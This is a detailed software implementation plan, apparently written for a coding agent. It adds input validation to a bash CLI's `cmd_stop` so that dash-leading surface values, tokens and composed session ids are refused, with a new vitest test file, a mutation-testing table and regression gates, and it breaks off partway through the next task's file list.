- Modify `ccd/ccd`, the function `cmd_stop() {   # [--surface <word>] <id>  |  [--surface <word>] <wrapper> <project>`. It is at export `:25887` and about `:25891` after Task 1's four lines. That number is a hint only: locate it with `grep -n '^cmd_stop() {' ccd/ccd`. Three edits, each located by quoted content in Step 3:
  - (A) The header. A paragraph on order independence goes after the paragraph ending `does not exist while the real one keeps running.` The phrase `FLAGS ARE STRIPPED BEFORE THE ARITY RULE` stays, because ws-release and ws-archive tell readers to grep it.
  - (B) The loop:
    - the arity comment above the `--surface)` arm (3 lines become 5);
    - the `--surface)` arm's test;
    - the `--surface=*)` arm (1 line becomes 2);
    - after `set -- "${args[@]}"`, the residue rule (one comment line and one code line).
  - (C) After the `fi` that closes the `id="${1:?usage: …}"` branch, before `# Through the choke point, never around it`: the composed-id check (two comment lines and one code line).
  - Net: +16 lines, all inside `cmd_stop`. These lines are below every frozen anchor (`:19131`) and below `cmd_start()`. Then restamp.
- Create the test `server/test/ccd-stop-dash-id.test.ts`.
- No other file. `ccd-session-state.test.ts`, `ccd-workspaces.test.ts`, `ccd-lifecycle-sites.test.ts` and `ccd-operator-choice.test.ts` run unedited as gates (Step 7).

**Interfaces:**
- Consumes:
  ```bash
  # Task 1, ccd/ccd (directly above `_ws_tmproot_id_ok`'s comment block):
  _reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it
  ```
  ```ts
  // Task 1, server/test/dashIdFixture.ts
  export const DASH_IDS = ['--actor', '--surface', '--reason', '--expect', '--defer-expired', '--session', '--branch', '--child-of'] as const;
  export const DECOY_IDS = ['agent', 'pwa'] as const;
  export function plantRow(home: string, id: string, fields?: Readonly<Record<string, string>>): void;   // node:fs, never ccd
  export function regListing(home: string): string[];                                                  // $REG, sorted, `.lifecycle` excluded
  // Existing at the export:
  export function makePrHarness(prefix: string): PrHarness;          // server/test/ccdPrHelpers.ts
  //   PrHarness.run(snippet: string): { code: number; stdout: string; stderr: string }   (never throws)
  //   CcdHarness.home / reg(id, field): string | null / calls(): string[] / systemctlCalls(): string[] / cleanup()
  export const readJournal: (home: string) => Record<string, unknown>[];           // server/test/lifecycleHelpers.ts
  export const eventsOf: (home: string, act: string) => Record<string, unknown>[];
  export const decOf: (e: Record<string, unknown>) => Record<string, string>;
  export function asManagerCalls(lines: string[]): string[];                       // server/test/platformFixtures.ts
  ```
- Produces stop's three rules (§Interfaces "stop"). There is no new bash name, and the only new `die` text is R26's two lines:
  ```bash
        --surface)   [[ $# -ge 2 && $2 != -* ]] || die "usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>"
        --surface=*) [[ ${1#--surface=} != -* ]] || die "usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>"
    local a; for a in "$@"; do [[ $a != -* ]] || die "bad session id: $a"; done
    _reg_id_ok "$id" || die "bad session id: $id"
  ```

- [ ] **Step 0: Measure the entry conditions (nothing is written)**

Run from the workspace root:

```bash
git log --oneline -1 | grep -c 'ws-reclaim, ws-expire and ws-collect take their id whole'   # (a0) 1: Task 2 is the last commit
grep -n '^_reg_id_ok() ' ccd/ccd                                                            # (a) one line: Task 1's helper
grep -nE '^export (const|function) (DASH_IDS|DECOY_IDS|plantRow|regListing)\b' server/test/dashIdFixture.ts   # (b) four lines
grep -n '^cmd_stop() {' ccd/ccd                                                             # (c) one line: record it (hint about 25891)
grep -n '^  stop) *shift; cmd_stop "\$@" ;;' ccd/ccd                                         # (d) one line: the dispatcher passes argv through unparsed
sed -n '/^cmd_stop() {/,/^}/p' ccd/ccd | grep -c 'FLAGS ARE STRIPPED BEFORE THE ARITY RULE'  # (e) 1
sed -n '/^cmd_stop() {/,/^}/p' ccd/ccd | grep -cF -e '--surface)   [[ $# -ge 2 ]] || die "usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>"'   # (f) 1
sed -n '/^cmd_stop() {/,/^}/p' ccd/ccd | grep -cF -e '--surface=*) surface="${1#--surface=}"; declared="$surface"; shift ;;'   # (g) 1
sed -n '/^cmd_stop() {/,/^}/p' ccd/ccd | grep -cF -e 'set -- "${args[@]}"'                  # (h) 1
sed -n '/^cmd_stop() {/,/^}/p' ccd/ccd | grep -cF -e '_lc_done stop "$id" "" dec.surface "$(_lc_surface_norm "$declared")"'   # (i) 1
sed -n '/^cmd_stop() {/,/^}/p' ccd/ccd | grep -c '_reg_id_ok'                                # (j) 0: no id check in stop yet
ls server/test/ccd-stop-dash-id.test.ts 2>/dev/null || echo "absent, as expected"            # (k)
```

Expected: every count is as stated, and the test file is absent. Record (c) in the SDD ledger, because Step 7 compares every hunk against it.

STOP rules:
- If (a) or (b) prints nothing, Task 1 is not on the branch. STOP and report `task-1-not-landed`.
- If (a0) prints 0, re-read `git log --oneline -3`. Tasks are strictly serial, so a missing Task 2 commit is a STOP.
- A count of 0 in (e) to (i) means the arm or line has changed shape. Re-read `cmd_stop` and locate the nearest content. A missing `--surface)` arm, a missing `set --` line or a missing `_lc_done stop` line is a STOP.

- [ ] **Step 1: Write the failing test**

Create `server/test/ccd-stop-dash-id.test.ts`:

```ts
// server/test/ccd-stop-dash-id.test.ts
//
// stop never takes a flag spelling as a surface value, a token or an id
// (path-identity spec §2.2, §2.4).
//
// `cmd_stop` strips `--surface` from ANY position before its arity rule, and a
// server before W1a composes the pair AFTER the id (`stop <id> --surface <word>`).
// So an id that spells `--surface` cannot be told from the key:
// `stop --surface --surface pwa` took `--surface` as the word and stopped `pwa`,
// the console's surface word. Every other dash-leading id stayed the literal id
// and was stopped as such. Three rules close it, and each has a case here that
// goes red without it:
//   - a `--surface` value, in either spelling, never begins with `-` (stop's usage line);
//   - no token left after the strip begins with `-` (`bad session id: <token>`);
//   - the composed id passes `_reg_id_ok` before the journal line (`bad session id: <id>`).
// Each refusal is a bare `die` before anything is journaled, so a refusal stops
// NOTHING: no journal line, no stamp, no keep marker, no unit call, no pane kill.
//
// STANDING NOTE: this file matches `ccd-workspaces.test.ts`'s `/^ccd.*\.ts$/`
// containment scan. It spawns no bash of its own: every snippet runs through
// `makePrHarness().run`, and every row is planted with node:fs (`plantRow`),
// never through ccd, so a row may be named for a flag.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { makePrHarness, type PrHarness } from './ccdPrHelpers.js';
import { decOf, eventsOf, readJournal } from './lifecycleHelpers.js';
import { asManagerCalls } from './platformFixtures.js';
import { DASH_IDS, DECOY_IDS, plantRow, regListing } from './dashIdFixture.js';

let h: PrHarness;

/** The real row the controls stop: a workspace-shaped id, as the suite's other stop cases use. */
const ID = 'demo-quiet-mesa';

/** stop's one usage literal. Every arity refusal and every dash-leading surface value answers with it. */
const USAGE = 'usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>';

/** Every id the residue rule refuses as one word: each flag spelling the server's builders append
 *  except `--surface` (it has its own two cases), and a short one. */
const RESIDUE_IDS: string[] = [...DASH_IDS.filter((d) => d !== '--surface'), '-x'];

/** The unit manager and tmux as shell functions that LOG, the `cmd_stop` idiom of
 *  `ccd-session-state.test.ts`. A function wins over the harness's PATH poison, so every call a stop
 *  makes lands in `$HOME/ccd-calls`, and a refusal leaves that file absent. */
const STOP = 'systemctl() { echo "systemctl $*" >> "$HOME/ccd-calls"; }; '
  + 'launchctl() { echo "launchctl $*" >> "$HOME/ccd-calls"; }; '
  + 'tmux() { echo "tmux $*" >> "$HOME/ccd-calls"; };';

/** `ccd stop <args>`, sourced, with the logging stubs; a failure is returned, never thrown. */
const stop = (args: string): { code: number; stdout: string; stderr: string } =>
  h.run(`${STOP} cmd_stop ${args}`);

/** The last stderr line: ccd's own `die` line (`ccd: <text>`), whatever the shell printed above it. */
const lastErr = (stderr: string): string => stderr.trim().split('\n').pop() ?? '';

/** `_tmux_t`'s exact pane target for an id, with `.` and `:` renamed as `_tmux` renames them. */
const paneOf = (id: string): string => `=cc-${id.replace(/[.:]/g, '_')}:`;

/** The row `id` was not stopped: no stamp, no keep marker, no stop row, and no unit call or pane kill names it. */
const notStopped = (id: string): void => {
  expect(h.reg(id, 'stopped'), `${id} carries no stop stamp`).toBeNull();
  expect(h.reg(id, 'choicekept'), `${id} carries no keep marker`).toBeNull();
  expect(eventsOf(h.home, 'stop').filter((e) => e['id'] === id), `no stop row names ${id}`).toEqual([]);
  expect(asManagerCalls(h.calls()).filter((l) => l.split(/\s+/).includes(`claude-session@${id}`)),
    `no unit call names ${id}`).toEqual([]);
  expect(h.calls().filter((l) => l === `tmux kill-session -t ${paneOf(id)}`), `no pane kill names ${id}`)
    .toEqual([]);
};

/** A refusal stopped NOTHING: no journal line at all, no stop stamp or keep marker anywhere under $REG,
 *  no call to the unit manager or tmux, and the harness's contained manager never reached. */
const nothingStopped = (): void => {
  expect(readJournal(h.home), 'a refusal journals nothing').toEqual([]);
  expect(regListing(h.home).filter((n) => /\.(stopped|choicekept)$/.test(n)), 'no stop stamp or keep marker')
    .toEqual([]);
  expect(h.calls(), 'no unit call, no pane kill and no probe').toEqual([]);
  expect(h.systemctlCalls(), 'the contained manager was never reached').toEqual([]);
};

beforeEach(() => {
  h = makePrHarness('ccrc-stop-dash-id-');
  // The decoys: the sweeps' `agent` and the console's `pwa`, the words a redirect lands on.
  for (const d of DECOY_IDS) plantRow(h.home, d);
  // The row the controls stop, and a row for every dash-leading id, so a stop that took one as its id
  // would find a live-looking row (its keep marker is the first thing such a stop writes).
  plantRow(h.home, ID);
  for (const d of [...DASH_IDS, '-x']) plantRow(h.home, d);
});
afterEach(() => { h.cleanup(); });

describe('stop never rebinds to the surface word, and never takes a flag spelling as an id (path-identity spec §2.4)', () => {
  it('the order a server before W1a composes for id --surface is refused, and pwa is never stopped', () => {
    // `stopId('--surface', 'pwa')` before W1a composes `['stop', '--surface', '--surface', 'pwa']`.
    // Without the value rule the arm takes `--surface` as the word, and `pwa` falls out as the id.
    const r = stop('--surface --surface pwa');
    expect(r.code).toBe(1);
    expect(lastErr(r.stderr)).toBe(`ccd: ${USAGE}`);
    notStopped('pwa');
    nothingStopped();
  });

  it("W1a's order for id --surface is refused by arity", () => {
    // `['stop', '--surface', 'pwa', '--surface']`: the arm takes `pwa` as the word, and the second
    // `--surface` has no value. The arm's own arity check refuses it, not an id check. Green before
    // this wave, and pinned so the order W1a moves to stays refused.
    const r = stop('--surface pwa --surface');
    expect(r.code).toBe(1);
    expect(lastErr(r.stderr)).toBe(`ccd: ${USAGE}`);
    notStopped('pwa');
    nothingStopped();
  });

  it('a --surface= value beginning with "-" is refused', () => {
    // The third row is the `=` spelling of the redirect: the word `--surface`, then `pwa` as the id.
    for (const args of [`--surface=-x ${ID}`, `${ID} --surface=--actor`, '--surface=--surface pwa']) {
      const r = stop(args);
      expect(r.code, args).toBe(1);
      expect(lastErr(r.stderr), args).toBe(`ccd: ${USAGE}`);
    }
    notStopped(ID);
    notStopped('pwa');
    nothingStopped();
  });

  it.each(RESIDUE_IDS)('a dash-leading id dies "bad session id" with no systemctl call and no stop row: %s', (id) => {
    // Three shapes: no surface (`['stop', id]`), a server before W1a (`['stop', id, '--surface', 'pwa']`)
    // and W1a's (`['stop', '--surface', 'pwa', id]`). Before this wave each one stopped the literal row.
    for (const args of [`'${id}'`, `'${id}' --surface pwa`, `--surface pwa '${id}'`]) {
      const r = stop(args);
      expect(r.code, args).toBe(1);
      expect(lastErr(r.stderr), args).toBe(`ccd: bad session id: ${id}`);
    }
    notStopped(id);
    notStopped('pwa');
    nothingStopped();
  });

  it('a dash-leading wrapper or project in the two-argument form dies', () => {
    // `stopPair` composes `['stop', w, p, '--surface', s]` before W1a and `['stop', '--surface', s, w, p]`
    // after it. `_id` would bury a dash-leading project INSIDE the composed id (`claude-a--x`), where
    // `_reg_id_ok` cannot see it, so the residue rule is what refuses these.
    const rows: ReadonlyArray<readonly [string, string, string]> = [
      // [the argv after `stop`, the die line, the id `_id` would have composed]
      ['claude-a -x', 'ccd: bad session id: -x', 'claude-a--x'],
      ['-x demo', 'ccd: bad session id: -x', '-x-demo'],
      ['--surface pwa -x demo', 'ccd: bad session id: -x', '-x-demo'],
      ['claude-a --actor --surface pwa', 'ccd: bad session id: --actor', 'claude-a---actor'],
      ['--surface pwa claude-a --actor', 'ccd: bad session id: --actor', 'claude-a---actor'],
      // A project of `--surface` before W1a: the arm would take `--surface` as the word and stop `claude-a-pwa`.
      ['claude-a --surface --surface pwa', `ccd: ${USAGE}`, 'claude-a-pwa'],
    ];
    for (const [args, said, composed] of rows) {
      const r = stop(args);
      expect(r.code, args).toBe(1);
      expect(lastErr(r.stderr), args).toBe(said);
      notStopped(composed);
    }
    notStopped('pwa');
    nothingStopped();
  });

  it('a composed id the registry charset refuses dies', () => {
    // Before this wave stop had no id check at all: these were journaled, stamped and sent to the
    // unit manager as `claude-session@a/b`.
    const rows: ReadonlyArray<readonly [string, string]> = [
      ["'a/b'", 'a/b'],
      ["'a b'", 'a b'],
      ["'a=b'", 'a=b'],
      ["claude-a 'p/q'", 'claude-a-p/q'],
    ];
    for (const [args, id] of rows) {
      const r = stop(args);
      expect(r.code, args).toBe(1);
      expect(lastErr(r.stderr), args).toBe(`ccd: bad session id: ${id}`);
    }
    nothingStopped();
  });

  it("an empty --surface value keeps today's meaning", () => {
    // An empty word is not a flag spelling. It is declared, normalised to `unknown` in the stamp, and
    // journaled as no declaration (`none`), exactly as before this wave.
    for (const args of [`--surface '' ${ID}`, `--surface= ${ID}`]) {
      const r = stop(args);
      expect(r.code, args).toBe(0);
      expect(r.stdout, args).toBe(`stopped ${ID}`);
      expect(h.reg(ID, 'stopped'), args).toMatch(/^\d{10} unknown$/);
    }
    const rows = eventsOf(h.home, 'stop');
    expect(rows).toHaveLength(2);
    expect(rows.map((e) => decOf(e)['surface'])).toEqual(['none', 'none']);
  });

  it('a well-formed id or pair is still stopped in either order, a dot-leading or inner-dash id included', () => {
    // THE CONTROL. Order stays free for every word that is not a flag spelling. The dot rule belongs to
    // the token verbs alone (path-identity spec §2.6), so stop still binds a dot-leading id, and
    // `_reg_id_ok` refuses a LEADING dash only, so an inner `--` (a wrapper may end in `-`) still binds.
    const rows: ReadonlyArray<readonly [string, string, RegExp]> = [
      [`${ID} --surface pwa`, ID, /^\d{10} pwa$/],
      [`--surface agent ${ID}`, ID, /^\d{10} agent$/],
      ['claude-a demo --surface pwa', 'claude-a-demo', /^\d{10} pwa$/],
      ['--surface pwa claude-a demo', 'claude-a-demo', /^\d{10} pwa$/],
      ['.hidden-x', '.hidden-x', /^\d{10} cli$/],
      ['a--b', 'a--b', /^\d{10} cli$/],
    ];
    for (const [args, id, stamp] of rows) {
      const r = stop(args);
      expect(r.code, args).toBe(0);
      expect(r.stdout, args).toBe(`stopped ${id}`);
      expect(h.reg(id, 'stopped'), args).toMatch(stamp);
    }
    // The surface word is never the id.
    notStopped('pwa');
    notStopped('agent');
  });
});
```

- [ ] **Step 2: Run the test to verify it fails**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-stop-dash-id.test.ts)
```

Run it in the foreground, with a timeout of at least 600000 ms.

Expected: the file loads, and the summary reads `Tests  12 failed | 3 passed (15)`. Each failing case reds on its first row, because before this wave every one of those stops exits 0:
- `the order a server before W1a composes…`: `expected +0 to be 1 // Object.is equality` (`pwa` was stopped);
- `a --surface= value…`: `--surface=-x demo-quiet-mesa: expected +0 to be 1`;
- all eight `a dash-leading id dies…` cases: `'<id>': expected +0 to be 1`;
- `…two-argument form dies`: `claude-a -x: expected +0 to be 1`;
- `…charset refuses dies`: `'a/b': expected +0 to be 1`.

These three pass by design:
- W1a's order: the arm's arity check already refuses it;
- the empty `--surface` case;
- the control.

The worker measures every red text; where the measured text differs, it replaces the draft's. A load error on `./dashIdFixture.js` means Task 1 is not on the branch: STOP (Step 0).

- [ ] **Step 3: Implement**

All three edits are in `ccd/ccd`, inside `cmd_stop`. Locate each by its quoted content, never by line number.

(A) The header. Replace:

```bash
  # FLAGS ARE STRIPPED BEFORE THE ARITY RULE, and that order is the whole
  # correctness argument. `$# -ge 2` means wrapper-plus-project, so with the
  # flag left in argv `ccd stop <id> --surface pwa` reads as a two-argument
  # stop and `_id` mints `<id>---surface` — aiming the stop at a session that
  # does not exist while the real one keeps running.
  #
  # The surface arrives as an argv flag because nothing else can carry it: the
```

with:

```bash
  # FLAGS ARE STRIPPED BEFORE THE ARITY RULE, and that order is the whole
  # correctness argument. `$# -ge 2` means wrapper-plus-project, so with the
  # flag left in argv `ccd stop <id> --surface pwa` reads as a two-argument
  # stop and `_id` mints `<id>---surface` — aiming the stop at a session that
  # does not exist while the real one keeps running.
  #
  # THE FLAG MAY STAND ON EITHER SIDE OF THE ID, SO NO POSITIONAL MAY SPELL A FLAG
  # (path-identity spec §2.4). With the pair after the id, an id of `--surface`
  # is the key itself: `ccd stop --surface --surface pwa` would take `--surface`
  # as the word and stop `pwa`. So a surface value never begins with `-`, no
  # token left after the strip does either, and the composed id passes
  # `_reg_id_ok` before anything is journaled. With the pair first,
  # `ccd stop --surface pwa --surface` is the arm's own arity refusal.
  #
  # The surface arrives as an argv flag because nothing else can carry it: the
```

(B) The loop and the residue rule. Replace:

```bash
      # An explicit arity check, not a bare `shift 2`: ccd runs under
      # `set -uo pipefail` with NO `-e`, so a shift past the end of argv fails,
      # shifts nothing, and this loop never terminates.
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>"
                   surface="$2"; declared="$2"; shift 2 ;;
      --surface=*) surface="${1#--surface=}"; declared="$surface"; shift ;;
      *)           args+=("$1"); shift ;;
    esac
  done
  set -- "${args[@]}"
```

with:

```bash
      # An explicit arity check, not a bare `shift 2`: ccd runs under
      # `set -uo pipefail` with NO `-e`, so a shift past the end of argv fails,
      # shifts nothing, and this loop never terminates. A value that begins with
      # `-`, in either spelling, is refused with the same usage line: it is a flag
      # spelling (an id the server put first), never a surface word.
      --surface)   [[ $# -ge 2 && $2 != -* ]] || die "usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>"
                   surface="$2"; declared="$2"; shift 2 ;;
      --surface=*) [[ ${1#--surface=} != -* ]] || die "usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>"
                   surface="${1#--surface=}"; declared="$surface"; shift ;;
      *)           args+=("$1"); shift ;;
    esac
  done
  set -- "${args[@]}"
  # Each token left is an id, a wrapper or a project, and none of them may begin with `-`.
  local a; for a in "$@"; do [[ $a != -* ]] || die "bad session id: $a"; done
```

(C) The composed id. Replace:

```bash
  else
    id="${1:?usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>}"
  fi
  # Through the choke point, never around it: the inlined `systemctl --user
```

with:

```bash
  else
    id="${1:?usage: ccd stop [--surface <word>] <id> | ccd stop [--surface <word>] <wrapper> <project>}"
  fi
  # The id AS COMPOSED, the one name every path, unit and pane below is built from: `_id`
  # joins two words, so this is the check that sees the whole name, its charset included.
  _reg_id_ok "$id" || die "bad session id: $id"
  # Through the choke point, never around it: the inlined `systemctl --user
```

These lines do not move:
- `_lc_done stop "$id" "" dec.surface "$(_lc_surface_norm "$declared")"`;
- the `[[ -e "$REG/$id.choicekept" ]] || _operator_choice_keep "$id"` line;
- `_ws_unsupervise "$id" "$surface" "$declared"`;
- the `tmux kill-session … || _operator_choice_unmark "$id"` line.

They keep their order and their adjacency, which `ccd-operator-choice.test.ts`'s census reads. No new comment line spells `_operator_choice_keep "$id"`, `_ws_unsupervise "` or the surface closed set.

- [ ] **Step 4: Restamp and syntax-check**

From the workspace root:

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd; echo "rc=$?"
```

Expected: `rc=0`. The stamp line changes only through this command, never by hand.

- [ ] **Step 5: Run the test to verify it passes**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-stop-dash-id.test.ts)
(cd server && ./node_modules/.bin/vitest run test/ownership.test.ts test/mark-check.test.ts)
```

Expected: `Tests  15 passed (15)`, and both stamp files PASS. Run each line in the foreground, with a timeout of at least 600000 ms.

- [ ] **Step 6: Mutation check**

Before the first mutation, keep the stamped file aside. From the workspace root:

```bash
mkdir -p "${TMPDIR:-/tmp}/ccrc-w1b-task3" && cp ccd/ccd "${TMPDIR:-/tmp}/ccrc-w1b-task3/ccd.task3"
```

For each row:
1. Make the edit in `ccd/ccd`.
2. Run `T`, which is `(cd server && ./node_modules/.bin/vitest run test/ccd-stop-dash-id.test.ts)`.
3. See the red.
4. Restore with `cp "${TMPDIR:-/tmp}/ccrc-w1b-task3/ccd.task3" ccd/ccd` before the next row. Shell variables do not survive between Bash calls, so the path is spelled out each time and never held in a variable.

The suite sources ccd, so a mutant needs no restamp. Every red text is measured by the worker; where the measured text differs, it replaces the draft's.

| # | Mutation (exact edit in `cmd_stop`) | Command | Expected red |
|---|---|---|---|
| 1 | `--surface)` arm: `[[ $# -ge 2 && $2 != -* ]]` becomes `[[ $# -ge 2 ]]` | `T` | "…before W1a composes…": `expected +0 to be 1` (`pwa` is stopped); "…two-argument form dies": `claude-a --surface --surface pwa: expected +0 to be 1` (`claude-a-pwa` is stopped) |
| 2 | `--surface)` arm over-tightened: `[[ $# -ge 2 && $2 != -* ]]` becomes `[[ $# -ge 2 && -n $2 && $2 != -* ]]` | `T` | "an empty --surface value…": `--surface '' demo-quiet-mesa: expected 1 to be +0` |
| 3 | `--surface=*)` arm: delete `[[ ${1#--surface=} != -* ]] \|\| die "usage: …"` from its first line, leaving `--surface=*)` alone on that line | `T` | "a --surface= value…": `--surface=-x demo-quiet-mesa: expected +0 to be 1` |
| 4 | Delete the line `local a; for a in "$@"; do [[ $a != -* ]] \|\| die "bad session id: $a"; done` | `T` | "…two-argument form dies": `claude-a -x: expected +0 to be 1` (`stopped claude-a--x`). The eight one-word cases stay GREEN, because the composed-id check refuses them with the same words. The residue rule's own red is the two-argument form (`stop-residue-red-is-the-pair-form`) |
| 5 | Residue rule over-tightened: `[[ $a != -* ]]` becomes `[[ $a != *-* ]]` | `T` | the control: `demo-quiet-mesa --surface pwa: expected 1 to be +0`; the empty-surface case and "…two-argument form dies" (`ccd: bad session id: claude-a`) red too |
| 6 | Delete the line `_reg_id_ok "$id" \|\| die "bad session id: $id"` | `T` | "…charset refuses dies": `'a/b': expected +0 to be 1` (`stopped a/b`, and a `stop` row journaled) |
| 7 | Composed-id check gains a dot rule: `_reg_id_ok "$id" \|\| die …` becomes `{ _reg_id_ok "$id" && [[ $id != .* ]]; } \|\| die …` | `T` | the control: `.hidden-x: expected 1 to be +0` |
| 8 | Move the `_reg_id_ok "$id" \|\| die "bad session id: $id"` line to directly below the `_lc_done stop "$id" "" dec.surface …` line | `T` | "…charset refuses dies": `a refusal journals nothing: expected [ …one stop row per refused id… ] to deeply equal []` |

After the last row:

```bash
cp "${TMPDIR:-/tmp}/ccrc-w1b-task3/ccd.task3" ccd/ccd && node shared/mark.mjs --check ccd/ccd; echo "rc=$?"   # rc=0: the stamped file is back
git diff --stat -- ccd/ccd                                                          # the same stat as before the first mutation
rm -r "${TMPDIR:-/tmp}/ccrc-w1b-task3"
```

- [ ] **Step 7: The gates and the boundary**

Run each line in the foreground, from the workspace root, with a timeout of at least 600000 ms:

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-session-state.test.ts -t 'cmd_stop')
(cd server && ./node_modules/.bin/vitest run test/ccd-workspaces.test.ts -t 'cmd_stop')
(cd server && ./node_modules/.bin/vitest run test/ccd-workspaces.test.ts -t 'routes EVERY bash call site')
(cd server && ./node_modules/.bin/vitest run test/ccd-lifecycle-sites.test.ts test/ccd-operator-choice.test.ts test/ccd-supervised-start.test.ts test/ccd-tmux-anchor.test.ts)
(cd server && ./node_modules/.bin/vitest run test/ccd-actor-flags.test.ts test/ccd-die-containment.test.ts test/ccd-refusal-scan.test.ts)
(cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier')
(cd server && ./node_modules/.bin/tsc --noEmit -p test/tsconfig.tests.json)
```

Expected: every file PASSES unedited, and `tsc` prints nothing. What each guards:
- `ccd-operator-choice.test.ts`: its census of every stop in ccd (`KEEPS` included) still reads `cmd_stop`'s keep, unsupervise and kill as three adjacent lines.
- `ccd-actor-flags.test.ts`: the surface closed set is still spelled twice.
- `ccd-refusal-scan.test.ts`: `SANCTIONED` is still 16, because `cmd_stop` is in no verb body.
- The `backticked _identifier` pass: `_reg_id_ok` and `_id` resolve.
- The citation passes: green with no number edited, because every edit sits below `:19131`.

`ccd-session-state` is a CLAUDE.md load flake. Re-run it in isolation before calling it a break. An existing file that goes red is NOT edited: name it by slug and STOP (HARD BOUNDARY).

Then prove where the edit landed:

```bash
git diff -U0 -- ccd/ccd | grep '^@@'                                                        # the stamp hunk `@@ -2 +2 @@`, then cmd_stop's hunks only
grep -n '^cmd_stop() {' ccd/ccd                                                             # unchanged from Step 0's (c)
sed -n '/^cmd_stop() {/,/^}/p' ccd/ccd | grep -c 'FLAGS ARE STRIPPED BEFORE THE ARITY RULE'  # 1
git status --porcelain -- ccd server                                                        # exactly: M ccd/ccd, ?? server/test/ccd-stop-dash-id.test.ts
```

Expected:
- Every hunk after the stamp's starts at or after the `cmd_stop() {` line recorded in Step 0.
- No function above `cmd_start()` moves.
- No other tracked file changes.

- [ ] **Step 8: Commit**

```bash
git add ccd/ccd server/test/ccd-stop-dash-id.test.ts
git commit -m "$(cat <<'MSG'
fix(ccd): stop refuses a dash-leading surface value, token or composed id

stop strips --surface from any position before its arity rule, and a
server before W1a appends the pair after the id. So an id that spells
--surface could not be told from the key: stop --surface --surface pwa
took --surface as the word and stopped pwa. Any other dash-leading id
was stopped as the literal row, and stop checked no id shape at all.

- A --surface value, in either spelling, never begins with "-"; the
  refusal is stop's usage line.
- No token left after the strip begins with "-":
  die "bad session id: <token>".
- The composed id passes _reg_id_ok before the journal line:
  die "bad session id: <id>".

Both new refusals are bare dies before anything is journaled, stamped
or sent to the unit manager. An empty --surface value, a dot-leading id
and an inner "--" keep today's meaning. The header keeps FLAGS ARE
STRIPPED BEFORE THE ARITY RULE and says why the order stays free.
Path-identity spec §2.4.
MSG
)"
```

Name these, by slug, in the wave-done:
- the substantive departures this task carries: `surface-dash-rule-at-stop-and-ws-add-only` (stop's half) and `stop-checks-its-residue-and-composed-id`;
- the plan-text correction `stop-residue-red-is-the-pair-form`;
- the spec correction `stop-pair-project-surface-redirected`: before W1a's order, `stopPair` with a project of `--surface` composed `stop <wrapper> --surface --surface pwa`, which stopped `<wrapper>-pwa`. That is a second stop redirect that spec §2.2's stop row does not list. Case 5's last row pins it refused, and Task 12's §2.9 should record it beside the `stop --surface pwa --surface` correction;
- the extra pins `stop-extra-pins`.

---

### Task 4: ws-release, ws-archive, ws-restore, ws-hold and ws-rename take their identity pairs whole (line-neutral)

**Model routing:** **`opus`, effort `xhigh`**. Release, archive and restore are the live redirects. All five functions start above the frozen compaction-card corpus, so every edit has to be line-neutral (R9). The SECURITY lens and the corpus lens read this diff.

**Why:**
- **Spec §2.1 and §2.2.** None of these five loops has a `--session` arm. The key and its value fall into the `*)` residue one token at a time, so the value is scanned again as a flag. The server's `ws-release --session --actor --surface agent --actor sweep` makes the `--actor` arm eat `--surface`, and `agent` (the sweeps' surface word) is bound as the id. Release, archive and restore redirect this way. ws-hold keeps an id of `--reason` as the literal id, and ws-rename does the same for `--branch`.
- **R17.** Each identity arm appends the key and its value to the residue, or the lone key when no value follows. No arm refuses anything itself. So each verb's existing exact-arity and order check still refuses a duplicate, a wrong order and a lone key with today's words, and the dec ladder still runs before arity.
- **§Interfaces.** Every post-loop id check becomes `_reg_id_ok`, which refuses a leading `-`. ws-restore keeps its `_lc_refuse … bad-session-id` dialect, and ws-rename keeps its JSON `bad-args` answer.
- **R9.** Each arm's line is paid for by folding one comment line in the same function:
  - in ws-release, ws-archive and ws-hold, the arity comment between `case "$1" in` and `--surface)`;
  - in ws-restore, the FIX ROUND 3 comment in that same window;
  - in ws-rename, the WAVE 5 paragraph above `local` (R9's ws-rename exception).

  Nothing after any arm moves.
- **R26.** No new `die` literal. `die "bad session id"` and the `_lc_refuse` token `bad-session-id` are reused. No new `"refused":"…"` token. ws-rename reuses `bad-args`.

**Departures and extra pins this task carries (named by slug for the coordinator; see the drafter notes):**
- `start-line-gate-split-at-task-1s-insert`
- `hold-and-rename-flag-ids-answer-bad-session-id`
- `hold-reason-spelling-a-flag-is-held-verbatim`
- `strip-reason-mutant-measured`
- `rename-branch-value-taken-whole`

**Files:**
- Modify `ccd/ccd`. Every edit is located by content and is line-neutral:
  - `cmd_ws_rename`:
    - the WAVE 5 paragraph is folded from 12 lines to 11 (anchor: `# WAVE 5 — THE DEC FLAGS, STRIPPED HERE AND NOT ONE LINE EARLIER.`);
    - the arm goes above `--surface)   if [[ $# -ge 2 ]]; then lc_gs=1; lc_surface="$2"; shift 2`;
    - the id check below `local id=$2 new=$4`.
  - `cmd_ws_hold`:
    - the "TWO FLAGS, NOT THREE" note is reworded, 5 lines to 5;
    - the arm, with the arity comment folded from 3 lines to 2;
    - the id check below `local lc_reason=$reason`.
  - `cmd_ws_release`:
    - the WAVE 5 header's last four lines are reworded, 4 to 4;
    - the arm, with the arity comment folded from 4 lines to 3;
    - the id check below `local id=$2`.
  - `cmd_ws_archive`: the same three edits as ws-release.
  - `cmd_ws_restore`:
    - the arm, with the FIX ROUND 3 comment folded from 12 lines to 11;
